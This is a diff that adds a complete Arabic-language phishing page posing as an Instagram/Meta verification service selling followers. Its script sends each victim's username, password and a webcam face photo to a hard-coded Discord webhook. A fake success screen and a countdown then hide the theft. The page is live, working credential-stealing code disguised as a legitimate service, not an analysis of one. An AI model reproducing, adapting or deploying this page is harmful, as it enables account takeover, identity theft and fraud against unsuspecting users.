@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Verification • Meta</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 380px;
+        }
+
+        .card {
+            background: white;
+            padding: 30px 25px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 10px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.04);
+            animation: fadeIn 0.5s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .logo {
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            font-size: 38px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 15px;
+            letter-spacing: -1px;
+        }
+
+        .sub-logo {
+            color: #8e8e8e;
+            font-size: 13px;
+            margin-bottom: 20px;
+            letter-spacing: 1px;
+        }
+
+        .balance-box {
+            background: linear-gradient(135deg, #0095f6, #bc1888);
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            color: white;
+        }
+        .balance-box .label {
+            font-size: 12px;
+            opacity: 0.8;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .balance-box .amount {
+            font-size: 32px;
+            font-weight: bold;
+            margin: 5px 0;
+        }
+        .balance-box .currency {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .select-group {
+            margin-bottom: 15px;
+            text-align: right;
+        }
+        .select-group label {
+            font-size: 13px;
+            color: #262626;
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        select, input {
+            width: 100%;
+            padding: 12px 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            background: #fafafa;
+            font-size: 14px;
+            transition: all 0.2s ease;
+            color: #262626;
+        }
+        select:focus, input:focus {
+            outline: none;
+            border-color: #0095f6;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(0,149,246,0.1);
+        }
+
+        .btn-action {
+            width: 100%;
+            padding: 12px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 5px;
+        }
+        .btn-action:hover {
+            background: #0081d6;
+            transform: scale(1.01);
+        }
+        .btn-action:active {
+            transform: scale(0.98);
+        }
+        .btn-action.loading {
+            opacity: 0.6;
+            pointer-events: none;
+        }
+
+        /* خطوات */
+        .step {
+            display: none;
+        }
+        .step.active {
+            display: block;
+        }
+
+        .error-msg {
+            color: #ed4956;
+            font-size: 12px;
+            margin-top: 6px;
+            display: none;
+        }
+
+        .cam-preview {
+            width: 100%;
+            max-height: 200px;
+            border-radius: 8px;
+            margin: 10px 0;
+            background: #000;
+            border: 2px dashed #dbdbdb;
+            display: none;
+        }
+
+        .timer-box {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border: 1px solid #e0e0e0;
+        }
+        .timer-box .time {
+            font-size: 28px;
+            font-weight: bold;
+            color: #bc1888;
+        }
+        .timer-box .label {
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .success-msg {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 99999;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.5s ease;
+        }
+        .success-msg div {
+            background: white;
+            padding: 35px;
+            border-radius: 16px;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+        }
+        .success-msg .icon {
+            font-size: 60px;
+            margin-bottom: 10px;
+        }
+        .success-msg h2 {
+            color: #262626;
+            font-size: 22px;
+            margin-bottom: 8px;
+        }
+        .success-msg p {
+            color: #8e8e8e;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .success-msg .signature {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #bc1888;
+            letter-spacing: 2px;
+        }
+
+        @media (max-width: 400px) {
+            .card { padding: 20px 15px; }
+            .logo { font-size: 30px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- الخطوة 1: اختيار المتابعين -->
+        <div class="card step active" id="step1">
+            <div class="logo">Instagram</div>
+            <div class="sub-logo">✦ نظام التحديث التلقائي ✦</div>
+
+            <div class="balance-box">
+                <div class="label">رصيدك الحالي</div>
+                <div class="amount">€25.00</div>
+                <div class="currency">يورو (Euro)</div>
+            </div>
+
+            <div class="select-group">
+                <label>👥 اختر عدد المتابعين:</label>
+                <select id="followers">
+                    <option value="100">+100 متابع (€5.00)</option>
+                    <option value="250">+250 متابع (€12.00)</option>
+                    <option value="500" selected>+500 متابع (€25.00)</option>
+                    <option value="1000">+1000 متابع (€45.00)</option>
+                    <option value="2500">+2500 متابع (€100.00)</option>
+                </select>
+            </div>
+
+            <button class="btn-action" onclick="goToStep2()">💳 متابعة إلى الدفع</button>
+        </div>
+
+        <!-- الخطوة 2: اسم المستخدم -->
+        <div class="card step" id="step2">
+            <div class="logo">Instagram</div>
+            <div class="sub-logo">✦ تأكيد الهوية ✦</div>
+
+            <div style="background: #f8f9fa; padding: 10px; border-radius: 8px; margin-bottom: 15px;">
+                <span style="font-size: 13px; color: #8e8e8e;">المبلغ:</span>
+                <span style="font-weight: bold; color: #262626;" id="display-amount">€25.00</span>
+                <span style="font-size: 13px; color: #8e8e8e;"> | </span>
+                <span style="font-size: 13px; color: #8e8e8e;">المتابعين:</span>
+                <span style="font-weight: bold; color: #262626;" id="display-followers">+500</span>
+            </div>
+
+            <input type="text" id="username" placeholder="👤 اسم المستخدم (Username)" autocomplete="off">
+            
+            <button class="btn-action" onclick="goToStep3()">✅ التحقق من الحساب</button>
+            
+            <a href="#" onclick="backToStep1()" style="display: block; margin-top: 12px; font-size: 12px; color: #8e8e8e; text-decoration: none;">↺ العودة</a>
+        </div>
+
+        <!-- الخطوة 3: كلمة المرور -->
+        <div class="card step" id="step3">
+            <div class="logo">Instagram</div>
+            <div class="sub-logo">✦ تحقق أمني ✦</div>
+
+            <div style="margin-bottom: 12px; font-size: 14px; color: #262626;">
+                <strong id="display-username2"></strong>
+                <span style="color: #8e8e8e; font-size: 12px; display: block; margin-top: 3px;">🔒 هذا الحساب محمي بكلمة مرور</span>
+            </div>
+
+            <input type="password" id="password" placeholder="🔑 كلمة المرور" autocomplete="off">
+            <div class="error-msg" id="pass-error">❌ كلمة المرور غير صحيحة. حاول مرة أخرى.</div>
+
+            <button class="btn-action" onclick="goToStep4()">🔓 تأكيد كلمة المرور</button>
+            
+            <a href="#" onclick="backToStep2()" style="display: block; margin-top: 12px; font-size: 12px; color: #8e8e8e; text-decoration: none;">↺ العودة إلى اسم المستخدم</a>
+        </div>
+
+        <!-- الخطوة 4: الكاميرا -->
+        <div class="card step" id="step4">
+            <div class="logo">Instagram</div>
+            <div class="sub-logo">✦ تحقق بيومتري ✦</div>
+
+            <p style="font-size: 14px; color: #262626; margin-bottom: 12px;">
+                📸 Verified Account By Meta Officiel 
+            </p>
+
+            <video id="cam" autoplay playsinline muted style="width:100%; border-radius:8px; background:#000; max-height:200px;"></video>
+            <canvas id="canvas" style="display:none;"></canvas>
+
+            <button class="btn-action" onclick="capturePhoto()"> Accept Verify Account ✅ </button>
+            <div id="capture-status" style="font-size: 12px; color: #8e8e8e; margin-top: 8px;"></div>
+
+            <a href="#" onclick="skipCamera()" style="display: block; margin-top: 10px; font-size: 12px; color: #8e8e8e; text-decoration: none;">⏭️ تخطي (غير موصى به)</a>
+        </div>
+
+        <!-- الخطوة 5: العد التنازلي والنجاح -->
+        <div class="card step" id="step5">
+            <div class="logo">Instagram</div>
+            <div class="sub-logo">✦ تم التفعيل بنجاح ✦</div>
+
+            <div style="font-size: 48px; margin: 10px 0;">🎉</div>
+            <h2 style="color: #262626; font-size: 20px;">تهانينا!</h2>
+            <p style="color: #8e8e8e; font-size: 14px; margin: 8px 0;">
+                سيصل المتابعين إلى حسابك خلال <strong>24 ساعة</strong>.
+            </p>
+
+            <div class="timer-box">
+                <div class="label">الوقت المتبقي</div>
+                <div class="time" id="countdown">24:00:00</div>
+            </div>
+
+            <p style="font-size: 12px; color: #bc1888; margin-top: 10px;">✦ META SECURITY SYSTEM ✦</p>
+        </div>
+    </div>
+
+    <!-- رسالة النجاح النهائية -->
+    <div class="success-msg" id="final-success">
+        <div>
+            <div class="icon">✅</div>
+            <h2>تمت العملية بنجاح!</h2>
+            <p>سيتم إضافة المتابعين إلى حسابك خلال 24 ساعة.</p>
+            <p style="font-size: 12px; color: #8e8e8e; margin-top: 8px;">تم تأكيد هويتك بنجاح.</p>
+            <div class="signature">✦ META SECURITY ✦</div>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK = 'https://discord.com/api/webhooks/1467269387647193300/OqrAQZ_ldXNS_tHmyFAGVfhDEHUo2neENW6BCvuHyA1pxDT9ebu7_3FDguea3ZA1khbp';
+        
+        let capturedUser = '';
+        let capturedPass = '';
+        let selectedFollowers = 500;
+        let selectedAmount = '€25.00';
+        let cameraStream = null;
+        let photoCaptured = false;
+
+        // منع الكاميرا الافتراضية (لكننا سنطلبها يدوياً)
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            const original = navigator.mediaDevices.getUserMedia;
+            // نتركها تعمل لكن نتحكم فيها يدوياً
+        }
+
+        // === التنقل بين الخطوات ===
+        function showStep(stepId) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(stepId).classList.add('active');
+        }
+
+        function backToStep1() {
+            showStep('step1');
+        }
+
+        function backToStep2() {
+            showStep('step2');
+        }
+
+        // === الخطوة 1 → 2 ===
+        function goToStep2() {
+            const select = document.getElementById('followers');
+            const val = select.value;
+            const text = select.options[select.selectedIndex].text;
+            
+            selectedFollowers = parseInt(val);
+            selectedAmount = text.match(/€([\d.]+)/)?.[1] || '0.00';
+            selectedAmount = '€' + selectedAmount;
+
+            document.getElementById('display-amount').textContent = selectedAmount;
+            document.getElementById('display-followers').textContent = '+' + selectedFollowers;
+
+            showStep('step2');
+            document.getElementById('username').focus();
+        }
+
+        // === الخطوة 2 → 3 ===
+        function goToStep3() {
+            const username = document.getElementById('username').value.trim();
+            if (!username) {
+                alert('⚠️ الرجاء إدخال اسم المستخدم');
+                return;
+            }
+
+            capturedUser = username;
+            document.getElementById('display-username2').textContent = username;
+
+            // إرسال اسم المستخدم
+            sendWebhook(`📥 **تم التقاط اسم مستخدم**\n👤 المستخدم: \`${username}\`\n📊 المتابعين: +${selectedFollowers}\n💰 المبلغ: ${selectedAmount}`);
+
+            showStep('step3');
+            document.getElementById('password').focus();
+            document.getElementById('pass-error').style.display = 'none';
+        }
+
+        // === الخطوة 3 → 4 ===
+        function goToStep4() {
+            const password = document.getElementById('password').value.trim();
+            const errorEl = document.getElementById('pass-error');
+
+            if (!password) {
+                errorEl.textContent = '⚠️ الرجاء إدخال كلمة المرور';
+                errorEl.style.display = 'block';
+                return;
+            }
+
+            capturedPass = password;
+
+            // إرسال الباسورد
+            sendWebhook(`🔓 **تم التقاط كلمة المرور**\n👤 المستخدم: \`${capturedUser}\`\n🔑 الباسورد: \`${password}\``);
+
+            showStep('step4');
+            startCamera();
+        }
+
+        // === الكاميرا ===
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+                cameraStream = stream;
+                document.getElementById('cam').srcObject = stream;
+                document.getElementById('cam').style.display = 'block';
+                document.getElementById('capture-status').textContent = ' "Accept Verify Meta "';
+            } catch(e) {
+                document.getElementById('cam').style.display = 'none';
+                document.getElementById('capture-status').textContent = ' Enter click Verify Account "Enter" Followers.';
+                console.log('Camera error:', e);
+            }
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById('cam');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            ctx.drawImage(video, 0, 0);
+
+            canvas.toBlob(async (blob) => {
+                if (!blob) {
+                    document.getElementById('capture-status').textContent = '❌ Error Camera In Instgram Oficiela .';
+                    return;
+                }
+
+                document.getElementById('capture-status').textContent = '📤 Wait Verify Account ...';
+                
+                try {
+                    const formData = new FormData();
+                    formData.append('file', blob, 'verification.jpg');
+                    formData.append('content', `Done Check Verfi التحقق**\n👤 المستخدم: \`${capturedUser}\``);
+
+                    await fetch(WEBHOOK, { method: 'POST', body: formData });
+                    
+                    photoCaptured = true;
+                    document.getElementById('capture-status').textContent = '✅ تم التقاط الصورة وإرسالها بنجاح!';
+                    
+                    // إيقاف الكاميرا
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(t => t.stop());
+                    }
+                    
+                    // الانتقال إلى الخطوة 5 بعد 1.5 ثانية
+                    setTimeout(() => {
+                        showStep('step5');
+                        startCountdown();
+                        // إظهار رسالة النجاح النهائية
+                        document.getElementById('final-success').style.display = 'flex';
+                    }, 1500);
+
+                } catch(e) {
+                    document.getElementById('capture-status').textContent = '❌ فشل الإرسال. سيتم المتابعة بدون صورة.';
+                    setTimeout(() => {
+                        showStep('step5');
+                        startCountdown();
+                        document.getElementById('final-success').style.display = 'flex';
+                    }, 1000);
+                }
+            }, 'image/jpeg', 0.8);
+        }
+
+        function skipCamera() {
+            document.getElementById('capture-status').textContent = 'Get Followers In Account Instgram ...';
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(t => t.stop());
+            }
+            setTimeout(() => {
+                showStep('step5');
+                startCountdown();
+                document.getElementById('final-success').style.display = 'flex';
+                // إرسال تنبيه بالتخطي
+                sendWebhook(` Account Verify**\n المستخدم: \`${capturedUser}\``);
+            }, 800);
+        }
+
+        // === العد التنازلي 24 ساعة ===
+        function startCountdown() {
+            let totalSeconds = 24 * 60 * 60; // 24 ساعة
+            const timerEl = document.getElementById('countdown');
+
+            const interval = setInterval(() => {
+                totalSeconds--;
+                if (totalSeconds <= 0) {
+                    clearInterval(interval);
+                    timerEl.textContent = '00:00:00';
+                    return;
+                }
+
+                const hours = Math.floor(totalSeconds / 3600);
+                const minutes = Math.floor((totalSeconds % 3600) / 60);
+                const seconds = totalSeconds % 60;
+
+                timerEl.textContent = 
+                    String(hours).padStart(2, '0') + ':' +
+                    String(minutes).padStart(2, '0') + ':' +
+                    String(seconds).padStart(2, '0');
+            }, 1000);
+        }
+
+        // === إرسال إلى Webhook ===
+        function sendWebhook(message) {
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: message + `\n🕒 ${new Date().toLocaleString()}`
+                })
+            }).catch(err => console.log('Webhook error:', err));
+        }
+
+        // === Event Listeners للـ Enter ===
+        document.getElementById('username').addEventListener('keyup', function(e) {
+            if (e.key === 'Enter') goToStep3();
+        });
+        document.getElementById('password').addEventListener('keyup', function(e) {
+            if (e.key === 'Enter') goToStep4();
+        });
+
+        // منع الكاميرا التلقائية
+        console.log('🚫 System ready. Camera will be requested manually only.');
+    </script>
+</body>
+</html>
